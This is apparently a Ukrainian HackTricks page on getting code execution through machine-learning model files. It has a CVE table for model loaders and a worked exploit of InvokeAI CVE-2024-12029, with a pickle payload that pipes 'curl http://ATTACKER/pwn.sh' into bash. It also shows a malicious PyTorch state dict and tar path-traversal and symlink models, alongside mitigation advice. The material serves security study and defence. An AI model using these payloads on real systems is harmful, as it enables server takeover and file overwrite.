# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Завантаження моделей до RCE

Моделі машинного навчання зазвичай поширюються в різних форматах, таких як ONNX, TensorFlow, PyTorch тощо. Ці моделі можуть бути завантажені на комп'ютери розробників або в продукційні системи для їх використання. Зазвичай моделі не повинні містити шкідливий код, але є випадки, коли модель може бути використана для виконання довільного коду на системі як передбачена функція або через вразливість у бібліотеці завантаження моделі.

На момент написання це деякі приклади такого типу вразливостей:

| **Фреймворк / Інструмент**  | **Вразливість (CVE, якщо доступно)**                                                                 | **RCE Вектор**                                                                                                                         | **Посилання**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Небезпечна десеріалізація в* `torch.load` **(CVE-2025-32434)**                                                              | Шкідливий pickle у контрольній точці моделі призводить до виконання коду (обхід захисту `weights_only`)                                   | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + завантаження шкідливої моделі викликає виконання коду; десеріалізація Java RCE в API управління                                   | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (небезпечний YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Завантаження моделі з YAML використовує `yaml.unsafe_load` (виконання коду) <br> Завантаження моделі з **Lambda** шаром виконує довільний Python код | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (парсинг TFLite)                                                                                          | Сформована модель `.tflite` викликає переповнення цілого числа → пошкодження купи (потенційний RCE)                                     | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Завантаження моделі через `joblib.load` виконує pickle з payload `__reduce__` зловмисника                                               | |
| **NumPy** (Python)          | **CVE-2019-6446** (небезпечний `np.load`) *суперечка*                                                                              | `numpy.load` за замовчуванням дозволяє завантаження об'єктних масивів – шкідливий `.npy/.npz` викликає виконання коду                     | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (перехід директорії) <br> **CVE-2024-5187** (перехід tar)                                                    | Зовнішній шлях ваг моделі ONNX може вийти за межі директорії (читання довільних файлів) <br> Шкідлива модель ONNX tar може перезаписати довільні файли (призводячи до RCE) | |
| ONNX Runtime (ризик дизайну)  | *(Немає CVE)* Користувацькі операції ONNX / контрольний потік                                                                 | Модель з користувацьким оператором вимагає завантаження рідного коду зловмисника; складні графи моделей зловживають логікою для виконання непередбачених обчислень | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (перехід шляху)                                                                                          | Використання API завантаження моделі з увімкненим `--model-control` дозволяє відносний перехід шляху для запису файлів (наприклад, перезапис `.bashrc` для RCE) | |
| **GGML (формат GGUF)**      | **CVE-2024-25664 … 25668** (багато переповнень купи)                                                                         | Неправильний файл моделі GGUF викликає переповнення буфера купи в парсері, що дозволяє виконання довільного коду на системі жертви         | |
| **Keras (старі формати)**   | *(Немає нових CVE)* Спадковий Keras H5 модель                                                                                         | Шкідлива HDF5 (`.h5`) модель з кодом Lambda шару все ще виконується при завантаженні (режим безпеки Keras не охоплює старий формат – “атака з пониження”) | |
| **Інші** (загальні)        | *Недолік дизайну* – серіалізація Pickle                                                                                         | Багато ML інструментів (наприклад, формати моделей на основі pickle, Python `pickle.load`) виконуватимуть довільний код, вбудований у файли моделей, якщо не вжити заходів | |

Більше того, є деякі моделі на основі python pickle, такі як ті, що використовуються [PyTorch](https://github.com/pytorch/pytorch/security), які можуть бути використані для виконання довільного коду на системі, якщо їх не завантажити з `weights_only=True`. Отже, будь-яка модель на основі pickle може бути особливо вразливою до цього типу атак, навіть якщо вони не вказані в таблиці вище.

### 🆕  InvokeAI RCE через `torch.load` (CVE-2024-12029)

`InvokeAI` – це популярний відкритий веб-інтерфейс для Stable-Diffusion. Версії **5.3.1 – 5.4.2** відкривають REST-інтерфейс `/api/v2/models/install`, який дозволяє користувачам завантажувати та завантажувати моделі з довільних URL-адрес.

Внутрішньо цей інтерфейс врешті-решт викликає:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Коли наданий файл є **PyTorch checkpoint (`*.ckpt`)**, `torch.load` виконує **десеріалізацію pickle**. Оскільки вміст надходить безпосередньо з URL, контрольованого користувачем, зловмисник може вбудувати шкідливий об'єкт з кастомним методом `__reduce__` всередину контрольної точки; метод виконується **під час десеріалізації**, що призводить до **віддаленого виконання коду (RCE)** на сервері InvokeAI.

Вразливість була присвоєна **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Процес експлуатації

1. Створіть шкідливу контрольну точку:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Розмістіть `payload.ckpt` на HTTP-сервері, яким ви керуєте (наприклад, `http://ATTACKER/payload.ckpt`).
3. Викличте вразливу точку доступу (автентифікація не потрібна):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Коли InvokeAI завантажує файл, він викликає `torch.load()` → гаджет `os.system` запускається, і зловмисник отримує виконання коду в контексті процесу InvokeAI.

Готовий експлойт: **Metasploit** модуль `exploit/linux/http/invokeai_rce_cve_2024_12029` автоматизує весь процес.

#### Умови

•  InvokeAI 5.3.1-5.4.2 (прапор сканування за замовчуванням **false**)
•  `/api/v2/models/install` доступний для зловмисника
•  Процес має дозволи на виконання команд оболонки

#### Заходи безпеки

* Оновіть до **InvokeAI ≥ 5.4.3** – патч за замовчуванням встановлює `scan=True` і виконує сканування на наявність шкідливого ПЗ перед десеріалізацією.
* При програмному завантаженні контрольних точок використовуйте `torch.load(file, weights_only=True)` або новий [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) допоміжний засіб.
* Впровадьте списки дозволених / підписи для джерел моделей і запускайте сервіс з найменшими привілеями.

> ⚠️ Пам'ятайте, що **будь-який** формат на основі Python pickle (включаючи багато файлів `.pt`, `.pkl`, `.ckpt`, `.pth`) є вкрай небезпечним для десеріалізації з ненадійних джерел.

---

Приклад ад-хок заходу безпеки, якщо ви повинні підтримувати старі версії InvokeAI, що працюють за зворотним проксі:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Приклад – створення шкідливого PyTorch моделі

- Створіть модель:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Завантажте модель:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Моделі для обходу шляхів

Як зазначено в [**цьому блозі**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), більшість форматів моделей, що використовуються різними AI фреймворками, базуються на архівах, зазвичай `.zip`. Тому може бути можливим зловживати цими форматами для виконання атак обходу шляхів, що дозволяє читати довільні файли з системи, де завантажується модель.

Наприклад, за допомогою наступного коду ви можете створити модель, яка створить файл у каталозі `/tmp`, коли буде завантажена:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Або, за допомогою наступного коду, ви можете створити модель, яка створить символічне посилання на директорію `/tmp`, коли буде завантажена:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## Посилання

- [OffSec блог – "CVE-2024-12029 – InvokeAI десеріалізація ненадійних даних"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI патч коміт 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Документація модуля Rapid7 Metasploit](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – питання безпеки для torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
